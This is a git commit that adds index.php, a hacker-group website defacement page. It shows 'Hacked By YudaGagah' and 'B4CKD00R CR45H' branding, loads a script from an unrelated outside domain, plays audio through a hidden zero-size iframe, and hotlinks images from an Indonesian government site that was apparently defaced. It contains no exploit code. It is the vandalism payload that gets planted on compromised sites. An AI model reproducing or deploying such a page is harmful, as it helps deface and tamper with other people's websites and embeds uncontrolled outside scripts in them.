b52db3e166145563e6636f399934411ed5449c44
YUDAGAGAH <46402284+YUDAGAGAH@users.noreply.github.com>
2019-06-15 08:57:12 +0000

    Initial commit

---
+++ index.php
@@ -0,0 +1,23 @@
+<html><title>YudaGagah - B4CKD00R CR45H</title>
+<meta property="og:title" content="YudaGagah - B4CKD00R CR45H"> 
+<meta property="og:image" content=" http://www.dprd-tanjabtimkab.go.id/galeri/:).jpg ">
+<link rel="shortcut icon" href="http://www.dprd-tanjabtimkab.go.id/galeri/:).jpg"/>
+<meta property="og:description" content="Memories are trying to kill me.">
+<meta name="theme-color" content="#eaeded">
+<link href="https://fonts.googleapis.com/css?family=Share Tech Mono" rel='stylesheet' type='text/css'> 
+<link href="https://fonts.googleapis.com/css?family=Rajdhani" rel='stylesheet' type='text/css'> 
+<center>
+<body bgcolor="#eaeded"> 
+</style>
+<script src="http://e-mete.com/js/kdsnow.js"></script></style><style></style>
+<br><br><br> 
+<img src="https://www.nicepng.com/png/full/14-149766_nicodab-discord-emoji-nico-nico-nii-dab.png" width="420" /> 
+<br> 
+<font size='6' font face='Rajdhani' >Hacked By YudaGagah</font>
+<br> 
+<font size='6' color='#002E38' font face='Rajdhani'>Ada rindu yang selalu jatuh di terik sepi yang lupa berteduh :')</font> <br>
+<font size='6' font face='Rajdhani' > [ Copyright ©2019 - B4CKD00R CR45H ]</font>
+<iframe width="0" height="0" src="https://6.top4top.net/m_1260zvhj30.mp3" frameborder="0" allowfullscreen=""></iframe>
+</html>
+
+
